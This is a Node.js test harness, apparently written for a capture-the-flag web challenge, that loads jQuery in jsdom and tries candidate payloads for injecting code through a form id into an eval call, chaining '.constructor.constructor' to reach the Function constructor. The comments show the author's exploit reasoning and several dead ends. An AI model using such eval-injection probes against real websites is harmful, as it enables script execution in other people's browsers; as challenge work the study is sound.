const fs = require("fs");
const { JSDOM } = require("jsdom");
const jquerySrc = fs.readFileSync(__dirname + "/jq371.js", "utf8");

// Faithfully test: selector valid+empty AND real code execution (set window.__PWN__).
function test(format) {
  const html = `<!DOCTYPE html><html><body>
  <form id="poly_x" data-formula="x+y">
   <input id="x_standard" name="x" value="1"><input id="y_standard" name="y" value="2">
   <input name="formula" value="x+y"><div id="template_standard" hidden>t</div>
  </form><pre id="answer"></pre></body></html>`;
  const dom = new JSDOM(html, { runScripts: "dangerously", pretendToBeVisual: true, url:"https://polynomial.secso.cc/" });
  const { window } = dom;
  const s = window.document.createElement("script"); s.textContent = jquerySrc; window.document.head.appendChild(s);
  const $ = window.$;
  const form = window.document.querySelector("form");
  form.id = "poly_" + format;
  const selected = form.id.replace("poly_", "");
  window.__PWN__ = false;
  let res = { selLen:null, pwn:false };
  try {
    const t = $("#template_" + selected);
    res.selLen = t.length;
    if (t.length === 0) {
      window.type_standard = function(){ return "SAFE"; };
      try {
        // EXACT: eval(`type_${selected}(this, selected)`) with this=form, selected in scope
        window.eval("window.__run = function(selected){ return eval('type_'+selected+'(this, selected)'); }");
        window.__run.call(form, selected);
        res.pwn = !!window.__PWN__;
      } catch(e){ res.evalErr = e.message.split("\n")[0]; }
    } else res.safe = true;
  } catch(e){ res.selErr = e.message.split("\n")[0]; }
  return res;
}

// Payload goal: window.__PWN__=true.  selected==format is passed as arg2 (Function body candidate).
// type_standard.constructor.constructor === Function.  Free call = Function(form, <format>).
// arg1=form breaks param. Neutralize: make the CHAIN end at a fn ignoring arg1.
// Trick: use ...constructor.constructor and put the payload so it survives? No (param err first).
// Alternative reachable one-shot executor: NONE builtin.
// So: make arg1 harmless by targeting Function via a path where first arg is the BODY.
//   Not possible (positional).
// FINAL trick: use two-step within the SINGLE eval by making `selected` itself do the work when
//   used as a Function *body*, and force a call by making the outer expression a TAGGED template? no.
// Test candidates:
const cands = [
  // put payload in format; body = whole format string; but need it CALLED. Use .constructor.constructor
  // and accept arg1 by giving Function a valid first param via comment: format begins with comment so
  // body string = "<junk>". The PARAM is arg1 (form) though, not format. Dead.
  "standard.constructor.constructor",
  // Reach Function via string name (type_standard.name is a string) then constructor:
  "standard.name.big.constructor.constructor",
  // Use `this` (form) — its constructor chain — but chain is on type_standard, not this.
  // Try: make selected a getter bomb? no.
  "standard.constructor.constructor.call.call",
];
for (const c of cands) console.log(JSON.stringify(c),"=>",JSON.stringify(test(c)));
